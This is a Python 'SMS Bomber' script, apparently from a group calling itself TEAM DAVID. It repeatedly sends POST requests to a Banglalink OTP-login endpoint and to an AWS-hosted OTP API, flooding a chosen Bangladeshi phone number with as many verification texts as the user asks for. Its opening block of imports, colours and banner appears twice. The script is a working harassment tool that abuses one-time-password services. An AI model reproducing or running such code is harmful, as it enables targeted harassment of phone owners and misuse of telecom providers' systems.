
import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=yellow+"======================================================================================================================"
space=" "
logo=red+str("""
ooooooooooooo oooooooooooo                 .o.                ooo              	ooooo       oooooooooo.           oooooooooooo    oooooo         oooo     ooooo   oooooooooo.    
8'      888          `8 `888'               `8               .888.              `88.             	.888'           `888'          `Y8b       `888'     		 `8        `888 .     	 . 8'        ` 888 '    `888'        ` Y8b   
         888                888                                .8"888.             888b        	d'888             888              888  	 888           		         `888 .     . 8'            888       888            888    
         888                888oooo8                   .8'‌‌‌‌‌‍   `888.           8   Y88. 	.P  888             888              888      888oooo8                  `888 .   . 8'               888       888            888 
         888                888         "                  .88ooo888.         8      `888'       888             888              888  	888    	  "                    `888 . 8'                 888       888            888 
         888                888               o         .8'             `88.       8          Y         888             888            d88'  	 888        		o                `888'           		  888       888          d88' 
       o888o            o888ooooood8     o88o        o888o   o8o                  o888o        o888bood8P'   	   o888ooooood8       		  `T        			 o888o   o888bood8P'                    
""")

      
 #HEADER                
text=cyan+"\t\tDeveloped By : LEGEND AND CRIMINAL BOYZ FOR TD TEAM"+green+"\n\n\t\t★★ TEAM DEVID BD SMS Bomber ★★   \n" 

import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=yellow+"======================================================================================================================"
space=" "
logo=red+str("""
ooooooooooooo oooooooooooo                 .o.                ooo              	ooooo       oooooooooo.           oooooooooooo    oooooo         oooo     ooooo   oooooooooo.    
8'      888          `8 `888'               `8               .888.              `88.             	.888'           `888'          `Y8b       `888'     		 `8        `888 .     	 . 8'        ` 888 '    `888'        ` Y8b   
         888                888                                .8"888.             888b        	d'888             888              888  	 888           		         `888 .     . 8'            888       888            888    
         888                888oooo8                   .8'‌‌‌‌‌‍   `888.           8   Y88. 	.P  888             888              888      888oooo8                  `888 .   . 8'               888       888            888 
         888                888         "                  .88ooo888.         8      `888'       888             888              888  	888    	  "                    `888 . 8'                 888       888            888 
         888                888               o         .8'             `88.       8          Y         888             888            d88'  	 888        		o                `888'           		  888       888          d88' 
       o888o            o888ooooood8     o88o        o888o   o8o                  o888o        o888bood8P'   	   o888ooooood8       		  `T        			 o888o   o888bood8P'                    
""")

      
 #HEADER                
text=cyan+"\t\tDeveloped By : LEGEND AND CRIMINAL BOYZ FOR TD TEAM"+green+"\n\n\t\t★★ TEAM DAVID BD SMS Bomber ★★   \n" 
text=cyan+"\t\tMaked By : LABIB MIRZA      GRP LAC"+green+"\n\n\t\t★★ I AM OWNER THIS TOOLS ★★   \n" 
text=cyan+"\t\tCEO           : ROBI AND PREM "+green+"\n\n\t\t★★ TEAM DAVID ★★   \n" 
text=cyan+"\t\tManager   : SAIFUL AND HANIF"+green+"\n\n\t\t★★ TEAM DAVID ★★   \n" 
text=cyan+"\t\tS.admin    : OYON "+green+"\n\n\t\t★★ TEAM DAVID ★★   \n" 
text=cyan+"\t\tOld.s adm : ASIF"+green+"\n\n\t\t★★ TEAM DAVID ★★   \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)
#SELECT_MAIN
def opt():
	print(cyan+"\n==> Select Your Option From Below")
	print(yellow+"\n\n [1] Start BD SMS Bombing\n\n [2] Back to ROC-X")
	

#MAIN_TOOL
os.system('clear')
tt=1
header()	
opt()
while tt<2:
	opt2=str(input(blue+"\n\n [>] Enter the number of option : "+yellow))
	if opt2=="1":
		text=cyan+"\t\tMaked By : LABIB MIRZA"+green+"\n\n\t\t★★ TEAM BD SMS Bomber ★★   \n" 
		os.system('clear')
		header()
		number=str(input(blue+"\n\n [>] Enter The BD Number : "+yellow))
		ammount=int(input(blue+"\n [>] Enter The Ammount : "+yellow))
		os.system('clear')
		notice=cyan+"\n\t   [•] TEAM DAVID Tools in progress......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url=url = "https://0yzk2chfm3.execute-api.ap-southeast-1.amazonaws.com/prod/user/otp"
					headers=CaseInsensitiveDict()
					headers["Content-Type"]="application/json"
					datagp="""{\"mobile_number\":\"+88"""+number+"""\"}"""
					r=requests.post(url, headers=headers, data=datagp)
					
						
						
				if ammount2==1:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+green+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+green+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+green+"[✓] 3rd SMS Sent.")
				else:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(1)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+red+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+red+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+red+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n\t  ★★TEAM DAVID★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(10)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
		os.system('clear')
		notice=""
		text=green+"\n\n\t\t★★★TEAM DAVID SMS Tools★★★   \n" 
		header()
		opt()
	
			
	elif opt2=="2":
		os.system("python3 main2.py")
	else:
		text=cyan+"\t\tMAKED By : LABIB MIRZA"+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
		notice=red+"\n\t\t[×] Wrong Value Entered"
		os.system('clear')
		header()
		opt()
		continue
